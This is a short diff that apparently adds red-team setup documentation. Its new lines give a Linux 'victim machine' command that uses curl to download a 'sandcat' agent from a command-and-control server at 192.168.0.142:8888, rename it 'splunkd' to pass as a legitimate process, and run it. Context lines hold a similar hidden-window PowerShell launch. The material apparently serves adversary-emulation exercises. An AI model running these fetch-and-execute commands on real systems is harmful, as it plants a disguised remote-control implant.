@@ -23,3 +23,10 @@ rm -force "C:\Users\Public\splunkd.exe" -ea ignore;
 Start-Process -FilePath C:\Users\Public\splunkd.exe -ArgumentList "-server $server -group red" -WindowStyle hidden;
 ```
 
+Below is the code that we run on linux victim machine
+```bash
+server="http://192.168.0.142:8888/";
+curl -s -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download > splunkd;
+chmod +x splunkd;
+./splunkd -server $server -group red -v
+```
